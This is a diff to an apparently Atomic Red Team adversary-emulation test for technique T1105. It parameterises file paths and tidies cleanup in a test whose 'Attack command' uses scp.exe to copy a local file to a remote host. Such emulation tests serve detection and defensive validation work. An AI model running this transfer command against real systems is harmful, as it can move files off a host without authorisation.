@@ -985,7 +985,7 @@ atomic_tests:
     remote_path:
       description: Path of folder to copy
       type: path
-      default: /tmp/victim-files
+      default: /tmp/
     remote_host:
       description: Remote host to send 
       type: string
@@ -993,7 +993,11 @@ atomic_tests:
     local_path:
       description: Local path to copy from
       type: path
-      default: C:\temp\T1105.txt
+      default: C:\temp
+    file_name:
+      description: Name of the file to transfer
+      type: string
+      default: T1105.txt
     username:
       description: User account to authenticate on remote host
       type: string
@@ -1027,19 +1031,19 @@ atomic_tests:
     name: powershell
     command: |
       # Check if the folder exists, create it if it doesn't
-      $folderPath = "C:\temp"
+      $folderPath = "#{local_path}"
       if (-Not (Test-Path -Path $folderPath)) {
           New-Item -Path $folderPath -ItemType Directory
       }
 
       # Create the file
-      $filePath = Join-Path -Path $folderPath -ChildPath "T1055.txt"
+      $filePath = Join-Path -Path $folderPath -ChildPath "#{file_name}"
       New-Item -Path $filePath -ItemType File -Force
       Write-Output "File created: $filePath"
 
       # Attack command
       scp.exe #{local_path} #{username}@#{remote_host}:#{remote_path}
     cleanup_command: |
-      $filePath = Join-Path -Path "C:\temp" -ChildPath "T1055.txt"
-      Remove-Item -Path $filePath -Force
+      $filePath = Join-Path -Path "#{local_path}" -ChildPath "#{file_name}"
+      Remove-Item -Path $filePath -Force -erroraction silentlycontinue
       Write-Output "File deleted: $filePath"
